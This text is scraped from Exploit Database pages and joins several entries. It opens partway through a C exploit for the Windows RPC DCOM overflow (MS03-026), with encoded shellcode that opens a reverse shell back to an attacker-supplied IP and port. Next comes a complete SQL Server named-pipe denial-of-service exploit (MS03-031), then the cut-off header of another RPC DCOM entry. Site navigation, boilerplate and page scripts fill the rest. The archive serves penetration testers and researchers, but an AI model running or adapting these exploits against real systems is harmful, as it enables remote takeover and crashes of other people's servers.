x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};unsigned int jmpesp_cn_sp3 = "\x29\x2c\xe2\x77";unsigned int jmpesp_cn_sp4 = "\x29\x4c\xdf\x77";unsigned int jmpesp_en_xp_sp1="\xdb\x37\xd7\x77";unsigned char sc[]="\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x46\x00\x58\x00""\x29\x4c\xdf\x77"//jmp esp 's address on Windows 2k SP4 Chinese version."\x38\x6e\x16\x76\x0d\x6e\x16\x76"  //should be address which can be written.//here is SHELLCODE_¿we can use our SHELLCODE_¿but the length must be sizeof(shellcode)%16=12,if not please fill with 0x90//SHELLCODE can't has the code such as 0X00 and 0X5C"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\x93\x40\xe2\xfa"// code"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2""\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93""\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7""\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0""\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8""\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93""\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93""\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0""\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87""\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60""\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5""\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90""\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22""\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18""\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92""\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3""\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93""\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9""\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};void main(int argc,char ** argv){WSADATA WSAData;SOCKET sock;int len,len1;SOCKADDR_IN addr_in;short port=135;unsigned char buf1[0x1000];unsigned char buf2[0x1000];unsigned short port1;DWORD cb;printf("RPC DCOM overflow Vulnerability discoveried by LSD\n");printf("Code by FlashSky,Flashsky@xfocus.org,benjurry,benjurry@xfocus.org\n");printf("Welcome to our English Site: http://www.xfocus.org\n");printf("Welcome to our Chinese Site: http://www.xfocus.net\n");if(argc<5){printf("useage:%s targetip localIP LocalPort SPVersion\n",argv[0]);printf("SPVersion:\n0 w2k Chinese version +sp3\n 1 w2k Chinese version +SP4\n 2 winxp Englishversion +sp1\n");exit(1);}if(atoi(argv[4])==0)memcpy(sc+36,jmpesp_cn_sp3,sizeof(jmpesp_cn_sp3));else if (atoi(argv[4])==1)memcpy(sc+36,jmpesp_cn_sp4,sizeof(jmpesp_cn_sp4));else if (atoi(argv[4])==2)memcpy(sc+36,jmpesp_en_xp_sp1,sizeof(jmpesp_en_xp_sp1));if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}addr_in.sin_family=AF_INET;addr_in.sin_port=htons(port);addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return;}if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("Connect failed.Error:%d",WSAGetLastError());return;}port1 = htons(atoi(argv[3]));port1 ^= 0x9393;cb=inet_addr(argv[2]);cb ^= 0x93939393;*(unsigned short *)&sc[330+0x30] = port1;*(unsigned int *)&sc[335+0x30] = cb;len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}len=recv(sock,buf1,1000,NULL);if (send(sock,buf2,len1,0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}len=recv(sock,buf1,1024,NULL);}// milw0rm.com [2003-07-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 65
Microsoft Windows SQL Server - Remote Denial of Service (MS03-031) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows SQL Server - Remote Denial of Service (MS03-031)EDB-ID:65CVE:2003-0232EDB Verified:Author:refdomType:dosExploit:/Platform:WindowsDate:2003-07-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED////////////////////////////////////////////////////////////////////		Microsoft SQL Server DoS Remote Exploit (MS03-031)//						By refdom of xfocus//////////////////////////////////////////////////////////////////#include <stdio.h>#include <stdlib.h>#include <windows.h>void Usage(){printf("******************************************\n");printf("exp for Microsoft SQL Server DoS(MS03-031)\n\n");printf("\t Written by Refdom\n");printf("\t Email: refdom xfocus org\n");printf("\t Homepage: www.xfocus.org\n\n");printf("Usage: DOSMSSQL.exe server buffersize\n");printf("eg: DOSMSSQL.exe192.168.0.1 9000\n\n");printf("The buffersize depends on service pack level.\n");printf("I test it on my server: windows 2000, mssqlserver no sp.\n");printf("when buffersize is 9000, the server can be crashed.\n");printf("\n");printf("*******************************************\n\n");}int main(int argc, char* argv[]){char lpPipeName[50];char *lpBuffer = NULL;unsigned long ulSize = 0;BOOL bResult;DWORD dwWritten = 0, dwMode;HANDLE hPipe;Usage();printf("Starting...\n");if (argc != 3)goto Exit0;if (strlen(argv[1]) < 20){sprintf(lpPipeName, "\\\\%s\\\\.\\pipe\\sql\\query", argv[1]);}else{printf("Error!server\n");goto Exit0;}ulSize= atol(argv[2]);lpBuffer = (char*)malloc(ulSize + 2);if (NULL == lpBuffer){printf("malloc error!\n");goto Exit0;}memset(lpBuffer, 0, ulSize + 2);memset(lpBuffer, 'A', ulSize);*lpBuffer = '\x12';*(lpBuffer + 1) = '\x01';*(lpBuffer + 2) = '\x00';printf("Connecting Server...\n");hPipe = CreateFile(lpPipeName,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);if (INVALID_HANDLE_VALUE == hPipe){printf("Error!Connect server!%d\n", GetLastError());goto Exit0;}dwMode = PIPE_READMODE_MESSAGE;bResult = SetNamedPipeHandleState(hPipe,	 // pipe handle&dwMode,  // new pipe modeNULL,	  // don't set maximum bytesNULL);	 // don't set maximum timeif (!bResult){printf("Error!SetNamedPipeHandleState.%d\n", GetLastError());goto Exit0;}bResult = WriteFile(hPipe, lpBuffer, ulSize + 1, &dwWritten, NULL);if (!bResult){printf("\n\tError!WriteFile.%d\n\n", GetLastError());printf("When see the error message, the target may be crashed!!\n\n");goto Exit0;}Exit0:return 0;}// milw0rm.com [2003-07-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 66
Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)EDB-ID:66CVE:2003-0605EDB Verified:Author:H D MooreType:remoteExploit:/Platform:WindowsDate:2003-07-26Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the 